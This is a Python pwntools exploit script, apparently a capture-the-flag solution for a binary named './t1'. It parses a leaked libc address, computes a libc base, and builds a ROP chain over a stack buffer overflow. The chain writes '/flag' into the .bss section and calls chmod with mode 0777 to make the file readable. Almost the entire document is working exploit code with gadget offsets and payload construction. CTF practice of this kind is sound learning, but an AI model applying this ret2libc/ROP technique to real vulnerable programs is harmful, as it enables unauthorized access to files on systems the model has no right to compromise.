from pwn import *

# i didnt use the /bin/sh string from libc because
# alignment issues causing a SIGSEV with movaps
# in the system function.
# it can work in another way? probably

binary_path = './t1'
debug = True
p = None

def get_leaked_address(p):
    line = p.recvline()

    while b'[LEAK]' not in line:
        line = p.recvline()

    leaked_addrs = b'0x' + line.split(b'0x')[-1]
    leaked_addrs = leaked_addrs.split(b'.\n')[0]

    # converting byte string to hex int
    return int(leaked_addrs.decode(), 16)

if debug:
    p = process(binary_path)
    gdb.attach(p, '''
    b *main+447
    ''')
else:
    #host, port = ('mc.ax', 31077)
    #p = remote(host, port)
    p = process(binary_path)

# searching for ROP gadgets
binary_rop = ROP(binary_path)
binary = ELF(binary_path)
pop_rdi = p64(binary_rop.rdi.address) # pop rdi; ret;
pop_rsi = p64(binary_rop.rsi.address) # pop rdi; pop r15; ret;
system_libc = get_leaked_address(p) # getting the leak from binary output
base_libc = system_libc - 0x55410 # system_leak_libc - system offset from: nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system

# calculating useful gadgets in libc
libc_chmod_addr = base_libc + 0x110cd0
libc_write_rdi_to_rax = base_libc + 0x0009d24f # gadget for writing rdi to [rax]
libc_pop_rax = base_libc + 0x04a550 # pop rax; ret;

# chmod to give permissions to everyone because is good
chmod_777 = p64(0x1FF) # 0777

# the address in the memory binary with write permissions
# only works fixed because its not PIE
bss_start_section = p64(0x405000)

overflow_until_ret = b'A' * cyclic_find('haaaaaaa', n=8)
xpl = b''
xpl += overflow_until_ret
xpl += p64(libc_pop_rax) + bss_start_section # putting in rax the address for writing the string /flag
xpl += pop_rdi + b"/flag\0\0\0" # padding with nulls to write the 8 bytes
xpl += p64(libc_write_rdi_to_rax)
# calling chmod using the address where /flag was written
xpl += pop_rdi + bss_start_section
xpl += pop_rsi + chmod_777 + b'AAAABBBB' # b'AAAABBBB' is trash for the gadget pop to r15
xpl += p64(libc_chmod_addr)
p.sendline(xpl)